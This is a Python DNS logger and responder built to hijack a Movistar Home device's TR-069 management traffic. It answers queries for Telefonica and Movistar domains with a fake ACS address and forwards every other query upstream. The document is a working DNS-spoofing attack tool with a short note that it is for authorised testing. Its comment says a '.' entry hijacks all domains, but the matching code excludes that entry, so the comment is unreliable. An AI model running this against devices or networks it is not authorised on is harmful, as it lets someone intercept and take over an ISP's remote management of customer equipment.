# SANITIZED for publication. Part of the off-kernel TR-069/Troya tooling.
# Host addresses, key filenames and credentials were replaced with placeholders.
# Use only on a device you own / are authorised to test.
#!/usr/bin/env python3
"""
DNS logger/responder for Movistar Home TR-069 hijack.
Listens on UDP :53.
- Queries matching HIJACK_HOSTS get answered with MAC_IP (fake ACS).
- Everything else is FORWARDED to the normal upstream resolver, so the whole
  LAN can safely use this Mac as its DNS server.

Run:  sudo python3 dns_logger.py [mac_ip] [upstream_dns]
"""
import socket
import struct
import sys
import time

MAC_IP = sys.argv[1] if len(sys.argv) > 1 else "<tester-host>"
UPSTREAM = sys.argv[2] if len(sys.argv) > 2 else "<gateway>"
# subdomains of these hosts get hijacked; use "." to hijack everything (recon)
HIJACK_HOSTS = ["telefonica.net", "telefonica.com", "movistar.com", "movistar.es", "."]

def should_hijack(qname):
    q = qname.lower().rstrip(".")
    return any(q == h or (h != "." and (q.endswith("." + h))) for h in HIJACK_HOSTS)

def log(msg):
    print(time.strftime("[%H:%M:%S] ") + msg, flush=True)

def parse_qname(data, offset):
    labels = []
    while True:
        length = data[offset]
        if length == 0:
            offset += 1
            break
        labels.append(data[offset + 1:offset + 1 + length].decode(errors="replace"))
        offset += 1 + length
    return ".".join(labels), offset

def build_response(query_id, qname, qtype, answer_ip):
    # Header (1 question, 1 answer)
    header = struct.pack(">HHHHHH", query_id, 0x8180, 1, 1, 0, 0)
    # Question section (echo)
    q = b""
    for label in qname.split("."):
        q += bytes([len(label)]) + label.encode()
    q += b"\x00"
    q += struct.pack(">HH", qtype, 1)
    # Answer (A record)
    ans = b"\xc0\x0c" + struct.pack(">HHIH", 1, 1, 60, 4) + socket.inet_aton(answer_ip)
    return header + q + ans

def nx(query_id, qname, qtype):
    header = struct.pack(">HHHHHH", query_id, 0x8183, 1, 0, 0, 0)
    q = b""
    for label in qname.split("."):
        q += bytes([len(label)]) + label.encode()
    q += b"\x00"
    q += struct.pack(">HH", qtype, 1)
    return header + q

def handle(data, addr, sock):
    try:
        query_id = struct.unpack(">H", data[:2])[0]
        qname, offset = parse_qname(data, 12)
        qtype, qclass = struct.unpack(">HH", data[offset:offset + 4])
    except Exception:
        return
    if should_hijack(qname):
        # this is one of our targets (or wildcard mode): redirect to the Mac
        if qtype == 1:  # A
            log(f"DNS HIJACK: {qname} (A) from {addr[0]}  -> {MAC_IP}")
            sock.sendto(build_response(query_id, qname, qtype, MAC_IP), addr)
        else:
            log(f"DNS HIJACK: {qname} (type {qtype}) from {addr[0]}  -> NXDOMAIN")
            sock.sendto(nx(query_id, qname, qtype), addr)
        return
    # everything else: forward to the upstream resolver untouched
    log(f"DNS FORWARD: {qname} (type {qtype}) from {addr[0]}  -> {UPSTREAM}")
    try:
        fwd = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        fwd.settimeout(4)
        fwd.sendto(data, (UPSTREAM, 53))
        resp, _ = fwd.recvfrom(4096)
        sock.sendto(resp, addr)
        fwd.close()
    except Exception as e:
        log(f"  forward failed: {e}")
        sock.sendto(nx(query_id, qname, qtype), addr)

def main():
    udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udp.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    udp.bind(("", 53))
    log(f"DNS server on :53 | hijack hosts: {HIJACK_HOSTS} -> {MAC_IP} | upstream: {UPSTREAM}")
    while True:
        data, addr = udp.recvfrom(4096)
        handle(data, addr, udp)

if __name__ == "__main__":
    main()
